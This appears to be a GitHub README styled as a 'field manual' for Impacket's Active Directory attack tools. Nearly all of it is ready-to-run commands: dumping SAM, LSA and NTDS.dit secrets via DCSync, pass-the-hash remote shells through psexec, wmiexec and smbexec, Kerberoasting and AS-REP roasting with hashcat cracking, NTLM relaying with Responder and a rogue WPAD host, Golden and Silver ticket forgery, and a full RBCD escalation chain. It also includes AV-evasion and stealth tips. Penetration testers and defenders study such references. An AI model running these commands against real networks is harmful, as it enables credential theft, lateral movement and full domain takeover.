<!-- CYBERPUNK HEADER -->
<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗             ║
║  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝             ║
║  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║                ║
║  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║                ║
║  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║                ║
║  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝                ║
║                                                                              ║
║              [ Core Tools Field Manual // Deep Dive ]                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

<!-- BADGES -->
![Tool](https://img.shields.io/badge/TOOL-Impacket-red?style=for-the-badge&logo=python&logoColor=white)
![Active Directory](https://img.shields.io/badge/ACTIVE_DIRECTORY-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Network](https://img.shields.io/badge/NETWORK-SMB%2FRPC%2FLDAP-FF6B6B?style=for-the-badge&logo=hackthebox&logoColor=white)

[![Author](https://img.shields.io/badge/Author-0xNetrunner-00FF00?style=flat-square&logo=github)](https://github.com/00xNetrunner)
![Category](https://img.shields.io/badge/Category-AD_Exploitation-purple?style=flat-square)
![Protocol](https://img.shields.io/badge/Protocol-SMB%2FRPC%2FKerberos-blue?style=flat-square)

</div>

---

> **`[SYSTEM]`** The ultimate Python toolkit for Windows network protocol implementation and exploitation
>
> **`[STATUS]`** Module: `LOADED` | Target: `DOMAIN_CONTROLLER` | Protocol: `MULTI`

---

## 📋 >_ Table.Of.Contents()

- [Authentication Methods Summary](#-authentication-methods-summary)
- [secretsdump.py](#-secretsdumppy)
- [psexec.py](#-psexecpy)
- [wmiexec.py](#-wmiexecpy)
- [smbexec.py](#-smbexecpy)
- [GetUserSPNs.py (Kerberoasting)](#-getuserspnspy-kerberoasting)
- [GetNPUsers.py (AS-REP Roasting)](#-getnpuserspy-as-rep-roasting)
- [ntlmrelayx.py](#-ntlmrelayxpy)
- [getTGT.py / getST.py](#-gettgtpy--getstpy)
- [ticketer.py (Golden/Silver Tickets)](#-ticketerpy-goldensilver-tickets)
- [smbclient.py](#-smbclientpy)
- [rbcd.py (Resource-Based Constrained Delegation)](#-rbcdpy-resource-based-constrained-delegation)

---

## 🔑 Authentication Methods Summary

```
> Loading authentication modules...
> Initializing credential handlers...
> Status: READY
```

All Impacket tools support multiple authentication methods:

| Method | Syntax | Description |
|:-------|:-------|:------------|
| **Password** | `domain/user:password@target` | Standard credentials |
| **NTLM Hash (PtH)** | `-hashes LM:NT domain/user@target` | Pass-the-Hash |
| **Kerberos Ticket (PtT)** | `-k -no-pass domain/user@target` | Pass-the-Ticket (with `KRB5CCNAME` set) |
| **AES Key** | `-aesKey <key> domain/user@target` | Kerberos AES key |
| **Null Session** | `domain/''@target` or `-no-pass` | Anonymous/null auth |

### ⚙️ Common Global Flags

| Flag | Purpose |
|:-----|:--------|
| `-dc-ip IP` | Domain Controller IP |
| `-dc-host HOST` | Domain Controller hostname |
| `-k` | Use Kerberos authentication |
| `-no-pass` | Don't prompt for password |
| `-hashes LM:NT` | Pass-the-Hash |
| `-aesKey KEY` | Use AES key |
| `-debug` | Enable debug output |
| `-target-ip IP` | Target IP when using Kerberos |

---

## 💀 secretsdump.py

```
> Module: SECRETSDUMP
> Status: THE_CROWN_JEWEL
> Function: CREDENTIAL_EXTRACTION
```

The crown jewel of Impacket. Extracts credentials from Windows systems via multiple methods: SAM database, LSA secrets, cached domain credentials, and NTDS.dit (the AD database).

### 🔧 How It Works

```
[1] Connects via SMB/RPC to the target
[2] Dumps the SAM hive (local accounts)
[3] Extracts LSA secrets (service account passwords, machine account keys)
[4] If targeting a DC: uses DRSUAPI (DCSync) or VSS to pull NTDS.dit
```

### ⚡ Common Usage Patterns

**Remote dump with plaintext credentials:**
```bash
secretsdump.py domain.local/administrator:P@ssw0rd@10.10.10.10
```

**Remote dump with NTLM hash (Pass-the-Hash):**
```bash
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@10.10.10.10
```

**Remote dump with Kerberos ticket (Pass-the-Ticket):**
```bash
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k -no-pass domain.local/administrator@dc01.domain.local
```

**DCSync specific user only:**
```bash
secretsdump.py -just-dc-user krbtgt domain.local/administrator:P@ssw0rd@10.10.10.10
```

**DCSync NTLM hashes only (skip Kerberos keys):**
```bash
secretsdump.py -just-dc-ntlm domain.local/administrator:P@ssw0rd@10.10.10.10
```

**Offline extraction from copied registry hives:**
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

**Offline extraction from NTDS.dit:**
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-just-dc` | Only DCSync, skip SAM/LSA |
| `-just-dc-user USER` | DCSync single account |
| `-just-dc-ntlm` | DCSync NTLM only, no Kerberos keys |
| `-use-vss` | Use Volume Shadow Copy instead of DRSUAPI |
| `-exec-method {smbexec,wmiexec,mmcexec}` | Method for VSS commands |
| `-history` | Include password history |
| `-outputfile FILE` | Write output to file |

---

## 🖥️ psexec.py

```
> Module: PSEXEC
> Status: CLASSIC_EXECUTION
> Function: REMOTE_SHELL
```

The classic remote execution method. Mimics Sysinternals PsExec by uploading an executable service binary to `ADMIN$` and registering it as a Windows service.

### 🔧 How It Works

```
[1] Authenticates to SMB on the target
[2] Uploads a service executable to ADMIN$ (C:\Windows)
[3] Connects to the Service Control Manager (SCM) via RPC
[4] Creates and starts a new service pointing to the uploaded binary
[5] Service connects back, providing an interactive shell
[6] On exit, stops/deletes the service and removes the binary
```

### ⚡ Common Usage Patterns

**Interactive shell:**
```bash
psexec.py domain.local/administrator:P@ssw0rd@10.10.10.10
```

**Execute single command:**
```bash
psexec.py domain.local/administrator:P@ssw0rd@10.10.10.10 "ipconfig /all"
```

**Pass-the-Hash:**
```bash
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@10.10.10.10

# Can also use like:
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@10.10.10.10
```

**Specify alternate executable (useful for AV evasion):**
```bash
psexec.py -file /path/to/custom.exe domain.local/administrator:P@ssw0rd@10.10.10.10
```

**Use specific share:**
```bash
psexec.py -path C$ domain.local/administrator:P@ssw0rd@10.10.10.10
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-file FILE` | Use custom executable instead of default |
| `-path SHARE` | Use alternate share (default: ADMIN$) |
| `-service-name NAME` | Custom service name |
| `-remote-binary-name NAME` | Custom name for uploaded binary |
| `-codec CODEC` | Output encoding (e.g., utf-8, cp850) |

### ⚠️ OPSEC Considerations

```
[!] HIGH NOISE: Creates files, services, and event logs
[!] Detected by most EDR solutions
[!] Consider wmiexec.py or smbexec.py for stealth
```

---

## 👻 wmiexec.py

```
> Module: WMIEXEC
> Status: STEALTH_MODE
> Function: WMI_EXECUTION
```

Stealthier alternative to psexec. Uses Windows Management Instrumentation (WMI) for command execution. No binary dropped to disk.

### 🔧 How It Works

```
[1] Authenticates via DCOM/WMI
[2] Creates a Win32_Process to execute commands
[3] Output is written to a file in ADMIN$, read back via SMB, then deleted
[4] Semi-interactive shell (each command is a new process)
```

### ⚡ Common Usage Patterns

**Interactive shell:**
```bash
wmiexec.py domain.local/administrator:P@ssw0rd@10.10.10.10
```

**Execute single command:**
```bash
wmiexec.py domain.local/administrator:P@ssw0rd@10.10.10.10 "whoami /priv"
```

**Pass-the-Hash:**
```bash
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@10.10.10.10
```

**Kerberos authentication:**
```bash
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass administrator@dc01.domain.local
```

**Silently execute (no output retrieval):**
```bash
wmiexec.py -silentcommand domain.local/administrator:P@ssw0rd@10.10.10.10 "powershell -enc BASE64..."
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-shell-type {cmd,powershell}` | Shell interpreter |
| `-silentcommand` | Execute without retrieving output |
| `-nooutput` | Don't attempt to retrieve command output |
| `-codec CODEC` | Output encoding |
| `-com-version MAJOR:MINOR` | DCOM version |

### ⚠️ OPSEC Considerations

```
[+] No binary dropped to disk
[!] Still creates process and writes temporary files
[!] WMI process creation logged in event logs (Event ID 4688 if enabled)
```

---

## 🔧 smbexec.py

```
> Module: SMBEXEC
> Status: SERVICE_ABUSE
> Function: NATIVE_EXECUTION
```

Another execution method using native Windows services. Unlike psexec, it doesn't upload a binary—instead it abuses the service binary path to execute commands directly.

### 🔧 How It Works

```
[1] Creates a service with the command embedded in the service binary path
[2] Example: %COMSPEC% /Q /c echo whoami ^> \\127.0.0.1\C$\output.txt 2^>^&1
[3] Starts the service (executes the command)
[4] Reads output from the created file
[5] Deletes the service
```

### ⚡ Common Usage Patterns

**Interactive shell:**
```bash
smbexec.py domain.local/administrator:P@ssw0rd@10.10.10.10
```

**Pass-the-Hash:**
```bash
smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@10.10.10.10
```

**Specify execution mode:**
```bash
smbexec.py -mode SERVER domain.local/administrator:P@ssw0rd@10.10.10.10
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-mode {SHARE,SERVER}` | Output retrieval method |
| `-share SHARE` | Share for output (default: C$) |
| `-shell-type {cmd,powershell}` | Shell interpreter |
| `-service-name NAME` | Custom service name |

---

## 🎫 GetUserSPNs.py (Kerberoasting)

```
> Module: KERBEROAST
> Status: TICKET_EXTRACTION
> Function: OFFLINE_CRACKING
```

Extracts TGS tickets for accounts with Service Principal Names (SPNs) set. These tickets are encrypted with the service account's password hash and can be cracked offline.

### 🔧 How It Works

```
[1] Queries LDAP for accounts with servicePrincipalName attribute
[2] Requests TGS tickets for discovered SPNs via Kerberos
[3] Outputs tickets in crackable format (Hashcat/John)
```

### ⚡ Common Usage Patterns

**Enumerate SPNs only:**
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
```

**Request tickets:**
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request
```

**Output to file in Hashcat format:**
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt
```

**Target specific user:**
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request-user sqlservice
```

**Using Pass-the-Hash:**
```bash
GetUserSPNs.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/user -dc-ip 10.10.10.10 -request
```

**Using Kerberos auth:**
```bash
export KRB5CCNAME=user.ccache
GetUserSPNs.py -k -no-pass -dc-host dc01.domain.local domain.local/user -request
```

### 💥 Cracking the Hashes

```bash
# Hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule

# John
john --wordlist=wordlist.txt kerberoast.txt
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-request` | Request TGS tickets |
| `-request-user USER` | Target specific account |
| `-outputfile FILE` | Save tickets to file |
| `-usersfile FILE` | Check specific users from file |
| `-save` | Save tickets as ccache files |

---

## 🔓 GetNPUsers.py (AS-REP Roasting)

```
> Module: ASREP_ROAST
> Status: NO_PREAUTH_ABUSE
> Function: OFFLINE_CRACKING
```

Targets accounts with "Do not require Kerberos pre-authentication" enabled. Requests AS-REP responses that contain the user's encrypted timestamp (crackable offline).

### 🔧 How It Works

```
[1] Sends AS-REQ without pre-authentication data
[2] If the account doesn't require pre-auth, the KDC returns AS-REP
[3] The AS-REP contains encrypted data using the user's password hash
[4] Extract and crack offline
```

### ⚡ Common Usage Patterns

**Check known user:**
```bash
GetNPUsers.py domain.local/targetuser -dc-ip 10.10.10.10 -no-pass
```

**Enumerate and request (requires valid creds):**
```bash
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request
```

**Spray userlist (no auth required):**
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
```

**Output to file:**
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt
```

### 💥 Cracking the Hashes

```bash
# Hashcat
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule

# John
john --wordlist=wordlist.txt asrep.txt
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-request` | Request AS-REP |
| `-usersfile FILE` | List of users to test |
| `-format {hashcat,john}` | Output format |
| `-outputfile FILE` | Save hashes to file |
| `-no-pass` | No password (required for unauthenticated enum) |

---

## 🔄 ntlmrelayx.py

```
> Module: NTLM_RELAY
> Status: ULTIMATE_RELAY
> Function: CREDENTIAL_RELAY
```

The ultimate relay tool. Captures NTLM authentication and relays it to other services (SMB, LDAP, MSSQL, HTTP, IMAP, etc.).

### 🔧 How It Works

```
[1] Sets up rogue server(s) to capture authentication
[2] When a victim authenticates, relays the credential exchange to a target
[3] Uses the relayed session to perform actions (execute commands, dump hashes, modify AD, etc.)
```

### ⚡ Common Usage Patterns

**Basic relay to SMB:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

**Relay and execute command:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\\pwned.txt"
```

**Relay and dump SAM:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

**Relay to LDAP and escalate via delegation (RBCD):**
```bash
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
```

**Relay to LDAP and add computer:**
```bash
ntlmrelayx.py -t ldap://dc01.domain.local --add-computer ATTACKER01
```

**Relay to LDAP and perform DCSync ACL abuse:**
```bash
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user compromiseduser
```

**SOCKS proxy mode (keeps sessions alive):**
```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then use proxychains with other tools
```

**Serve a malicious WPAD file:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support -wh attacker-wpad
```

**Relay IPv6 (combine with mitm6):**
```bash
ntlmrelayx.py -6 -tf targets.txt -smb2support -wh wpad.domain.local
```

### 🎯 Key Flags

| Flag | Purpose |
|:-----|:--------|
| `-tf FILE` | File containing target hosts |
| `-t TARGET` | Single target URL |
| `-smb2support` | Enable SMB2 support |
| `-socks` | Enable SOCKS proxy for captured sessions |
| `-c COMMAND` | Command to execute on successful relay |
| `-e FILE` | Execute file on successful relay |
| `--delegate-access` | Create computer and set RBCD |
| `--escalate-user USER` | Add DCSync rights to user |
| `--add-computer` | Add a computer account |
| `-wh HOST` | WPAD host for redirect |
| `-6` | Enable IPv6 |
| `-i` | Interactive SMB shell |

### 🔗 Combining with Responder

```bash
# Terminal 1: Disable SMB/HTTP in Responder.conf, then:
responder -I eth0

# Terminal 2:
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

---

## 🎟️ getTGT.py / getST.py

```
> Module: KERBEROS_TICKETS
> Status: PASS_THE_TICKET
> Function: TICKET_REQUESTS
```

Request Kerberos tickets for use with Pass-the-Ticket attacks.

### getTGT.py - Request TGT

**With password:**
```bash
getTGT.py domain.local/user:password -dc-ip 10.10.10.10
# Outputs: user.ccache
```

**With NTLM hash (Overpass-the-Hash):**
```bash
getTGT.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/user -dc-ip 10.10.10.10
```

**With AES key:**
```bash
getTGT.py -aesKey <aes256_key> domain.local/user -dc-ip 10.10.10.10
```

### getST.py - Request Service Ticket

**Request ticket for specific SPN:**
```bash
getST.py -spn cifs/fileserver.domain.local -dc-ip 10.10.10.10 domain.local/user:password
```

**S4U2Self (impersonate user to self):**
```bash
getST.py -spn cifs/target.domain.local -impersonate Administrator -dc-ip 10.10.10.10 domain.local/machineaccount$:password
```

**S4U2Proxy (constrained delegation abuse):**
```bash
getST.py -spn cifs/dc01.domain.local -impersonate Administrator -dc-ip 10.10.10.10 domain.local/service:password
```

### 🔧 Using the Tickets

```bash
# Set environment variable
export KRB5CCNAME=/path/to/user.ccache

# Use with any Impacket tool
wmiexec.py -k -no-pass user@target.domain.local
secretsdump.py -k -no-pass user@dc01.domain.local
smbclient.py -k -no-pass user@fileserver.domain.local
```

---

## 🏆 ticketer.py (Golden/Silver Tickets)

```
> Module: TICKET_FORGE
> Status: PERSISTENCE_MODE
> Function: GOLDEN_SILVER_TICKETS
```

Forges Kerberos tickets for persistence or privilege escalation.

### 🥇 Golden Ticket

Requires: `krbtgt` hash, Domain SID

```bash
# Forge Golden Ticket for Administrator
ticketer.py -nthash <krbtgt_nthash> -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator
```

**With AES key:**
```bash
ticketer.py -aesKey <krbtgt_aes256_key> -domain-sid S-1-5-21-... -domain domain.local Administrator
```

**With specific groups:**
```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local -groups 512,513,518,519,520 Administrator
```

### 🥈 Silver Ticket

Requires: Service account hash, Domain SID, target SPN

```bash
# Forge Silver Ticket for CIFS on specific host
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/fileserver.domain.local Administrator
```

### 🔧 Using Forged Tickets

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass Administrator@dc01.domain.local
```

---

## 📁 smbclient.py

```
> Module: SMB_CLIENT
> Status: FILE_OPERATIONS
> Function: SHARE_BROWSING
```

Interactive SMB client for browsing shares and transferring files.

### ⚡ Common Usage Patterns

**Connect to target:**
```bash
smbclient.py domain.local/user:password@10.10.10.10
```

**Inside the shell:**
```bash
# List shares
shares

# Navigate
use C$
cd Windows
ls
pwd

# Download files
get ntds.dit
mget *.txt

# Upload files
put payload.exe

# Execute file info
info file.txt
```

### 🎯 Key Commands

| Command | Purpose |
|:--------|:--------|
| `shares` | List available shares |
| `use SHARE` | Connect to a share |
| `ls` | List directory contents |
| `cd DIR` | Change directory |
| `get FILE` | Download file |
| `put FILE` | Upload file |
| `mget PATTERN` | Download multiple files |
| `cat FILE` | Display file contents |
| `info FILE` | File metadata |
| `rm FILE` | Delete file |
| `mkdir DIR` | Create directory |

---

## 🔗 rbcd.py (Resource-Based Constrained Delegation)

```
> Module: RBCD
> Status: DELEGATION_ABUSE
> Function: PRIVILEGE_ESCALATION
```

Configures RBCD to enable service impersonation attacks.

### 🔧 Attack Chain

```
[1] Have GenericWrite/GenericAll over a computer object
[2] Create or control a computer account (need its credentials)
[3] Configure RBCD to allow your controlled account to impersonate users to the target
[4] Request S4U2Self + S4U2Proxy tickets
[5] Access target as impersonated user
```

### ⚡ Usage

**Configure RBCD:**
```bash
rbcd.py -delegate-from ATTACKER$ -delegate-to TARGET$ -action write domain.local/user:password -dc-ip 10.10.10.10
```

**Read current RBCD config:**
```bash
rbcd.py -delegate-to TARGET$ -action read domain.local/user:password -dc-ip 10.10.10.10
```

**Remove RBCD:**
```bash
rbcd.py -delegate-from ATTACKER$ -delegate-to TARGET$ -action remove domain.local/user:password -dc-ip 10.10.10.10
```

### 💥 Complete Attack Workflow

```bash
# 1. Add computer (if needed)
addcomputer.py -computer-name ATTACKER$ -computer-pass 'P@ssw0rd123' domain.local/user:password

# 2. Configure RBCD
rbcd.py -delegate-from ATTACKER$ -delegate-to TARGET$ -action write domain.local/user:password

# 3. Get impersonation ticket
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip 10.10.10.10 domain.local/ATTACKER$:'P@ssw0rd123'

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass TARGET.domain.local
```

---

<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    [ END OF TRANSMISSION // IMPACKET ]                       ║
║                                                                              ║
║                      "The network is our playground"                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

</div>
